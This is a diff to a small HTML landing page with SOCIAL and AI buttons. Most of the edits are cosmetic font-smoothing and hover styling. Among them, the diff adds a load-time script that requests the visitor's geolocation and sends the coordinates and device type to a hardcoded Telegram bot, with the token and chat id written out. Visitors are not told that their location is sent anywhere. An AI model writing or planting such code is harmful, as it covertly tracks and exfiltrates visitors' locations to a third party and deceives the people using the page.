@@ -6,36 +6,85 @@
     <title>DEV:NXVDPPP</title>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
+    <style>
+        * {
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            text-rendering: optimizeLegibility;
+        }
+    </style>
 </head>
 <body>
     <header style="margin-bottom: 20px;">
-        <h1>WELCOME</h1>
+        <h1 style="font-smooth: always; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;">WELCOME</h1>
     </header>
     <main>
         <div class="button-container" style="display: flex; flex-direction: column; align-items: center; gap: 15px;">
-            <!-- New single button to redirect to social page -->
-            <button class="button" onclick="redirectToPage()">SOCIAL</button>
-            <button class="button" onclick="AI()">AI</button>
+            <button class="button" onclick="redirectToPage()" style="font-smooth: always; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;">SOCIAL</button>
+            <button class="button" onclick="AI()" style="font-smooth: always; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;">AI</button>
         </div>
     </main>
-    <footer style="margin-top: 30px; font-size: 0.9em; color: #b3b3b3;">
+    <footer style="margin-top: 30px; font-size: 0.9em; color: #b3b3b3; font-smooth: always; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;">
         <p>&copy; 2025 ELITE PATCH. All rights reserved.</p>
+        <p style="font-smooth: always; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;"></p>
     </footer>
-
-    <script>
-        function redirectToPage() {
-            window.open('another-page.html', '_blank'); // Change to your social links page
-        }
-
-        function AI() {
-            window.open('advanced-ai.html', '_blank');
-        }
-
-        window.onload = function() {
-            const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "PC";
-            const footer = document.querySelector("footer");
-            footer.innerHTML += `<p>You're using a ${deviceType === "Mobile" ? "Mobile" : "PC"} device.</p>`;
-        };
-    </script>
 </body>
+<script>
+    function redirectToPage() {
+        window.open('another-page.html', '_blank');
+    }
+
+    function AI() {
+        window.open('advanced-ai.html', '_blank');
+    }
+
+    function sendLocationToTelegram(latitude, longitude, deviceType) {
+        const message = `📍 Location Data:\nDevice: ${deviceType}\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+        const telegramAPI = `https://api.telegram.org/bot7956295976:AAFGdbPF3q4hyZMC7nqf7whCv8uGA1ezD5k/sendMessage?chat_id=7291851471&text=${encodeURIComponent(message)}`;
+
+        fetch(telegramAPI)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error("Telegram API error");
+                }
+                console.log("Location sent to Telegram!");
+            })
+            .catch(error => console.error("Error sending to Telegram:", error));
+    }
+
+    window.onload = function() {
+        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "PC";
+        const footer = document.querySelector("footer");
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude } = position.coords;
+                    footer.innerHTML += `<p style="font-smooth: always; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;">You're using a ${deviceType} device. Your location is Latitude: ${latitude}, Longitude: ${longitude}.</p>`;
+                    sendLocationToTelegram(latitude, longitude, deviceType);
+                },
+                (error) => {
+                    console.error('Error fetching location:', error);
+                    footer.innerHTML += `<p style="font-smooth: always; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;">You're using a ${deviceType} device. Location access denied.</p>`;
+                }
+            );
+        } else {
+            footer.innerHTML += `<p style="font-smooth: always; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;">You're using a ${deviceType} device. Geolocation is not supported by your browser.</p>`;
+        }
+
+        document.querySelectorAll('button').forEach(button => {
+            button.style.transition = 'all 0.3s ease';
+            button.addEventListener('mouseover', () => {
+                button.style.transform = 'scale(1.05)';
+                button.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.2)';
+            });
+            button.addEventListener('mouseout', () => {
+                button.style.transform = 'scale(1)';
+                button.style.boxShadow = 'none';
+            });
+        });
+
+        console.log(`Device Type: ${deviceType}`);
+    };
+</script>
 </html>
